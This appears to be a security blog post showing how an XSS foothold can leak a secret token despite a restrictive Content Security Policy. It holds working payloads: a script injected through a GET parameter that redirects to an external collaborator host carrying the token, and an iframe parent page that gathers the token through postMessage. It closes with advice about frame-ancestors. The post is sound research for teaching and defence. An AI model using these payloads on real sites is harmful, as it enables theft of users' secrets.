---
layout: post
title: "Circumventing CSP Restrictions to Exfil Data from an XSS Foothold"
author: "Andres Rauschecker"
tags: [XSS, "Cross-Site Scripting", postMessage, iframe, CSP]
excerpt_separator: <!--more-->
---

Triggering an `alert()` from a cross-site scripting (XSS) vulnerability can be straightforward, but Content Security Policy (CSP) may block external resource loads. This article explores a scenario where cross-document messaging can still expose data from a vulnerable page.<!--more-->

## Scenario

- An XSS vulnerability exists in the `g` GET parameter.
- The page uses the following CSP, which blocks external resource loads:

```http
Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: *.andresr.de;
```

- A secret token is stored in a `<div id="secret">` element.

![XSS in the g GET parameter]( /assets/images/posts/circumventing-csp-restrictions-to-exfil-data-from-an-xss-foothold/image.png)

## XSS Data Exfiltration Attempts

An image request is blocked by the policy:

![The external image request is blocked by CSP]( /assets/images/posts/circumventing-csp-restrictions-to-exfil-data-from-an-xss-foothold/image-1.png)

### Quick win: Using `document.location`

A redirect can send the token to an external endpoint, but it must run after the page has loaded the element containing the token. An immediate redirect can fail because the element is not present yet:

![Immediate redirect fails before the secret element exists]( /assets/images/posts/circumventing-csp-restrictions-to-exfil-data-from-an-xss-foothold/image-2.png)

A short timeout allows the DOM to load first:

```text
http://app.local:8080/?g=<script>setTimeout(()=>{document.location='http://burp.oastify.com/?c='%2bdocument.getElementById('secret').textContent},1);</script>
```

![The delayed redirect extracts the token]( /assets/images/posts/circumventing-csp-restrictions-to-exfil-data-from-an-xss-foothold/image-3.png)

This approach is simple, but another technique can be useful when a redirect is not suitable. PortSwigger's [Web Security Academy](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source) covers controlling the source of web messages. The [`window.parent` property](https://developer.mozilla.org/en-US/docs/Web/API/Window/parent) provides a reference to an iframe's parent window.

### The Creative Way: `postMessage()` to the Parent Window

The approach is to:

1. Create an empty iframe.
2. Register a `MessageEvent` handler on the parent page.
3. Load the vulnerable page in the iframe after the handler is registered.
4. From the injected script, send the secret value to `window.parent` with `postMessage()` after the vulnerable page's DOM has loaded.

Example parent page:

```html
<html>
  <body>
    <iframe id="target" src=""></iframe>
    <script>
      window.addEventListener(
        "message",
        (event) => {
          console.log(event);
        },
        false
      );
      var target = document.getElementById("target");

      setTimeout(() => {
        target.src =
          "http://app.local:8080/?g=%3Cscript%3EsetTimeout(()=%3E{window.parent.postMessage(document.getElementById(%27secret%27).textContent,%22*%22)},1);%3C/script%3E";
      }, 3);
    </script>
  </body>
</html>
```

The message handler receives the token from the iframe's child window:

![Token sent from the iframe to its parent with postMessage]( /assets/images/posts/circumventing-csp-restrictions-to-exfil-data-from-an-xss-foothold/image-4.png)

## Takeaway

Cross-document messaging was added to the HTML standard relatively late; its first HTML5 draft appeared in 2008 ([the draft specification](https://www.w3.org/TR/2008/WD-html5-20080610/comms.html#cross-document)). It is worth understanding how this mechanism works and how it can be abused in an XSS context.

A restrictive CSP `frame-ancestors` directive can help defend against clickjacking and iframe-based exploitation. See MDN's documentation on [`frame-ancestors`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/frame-ancestors).
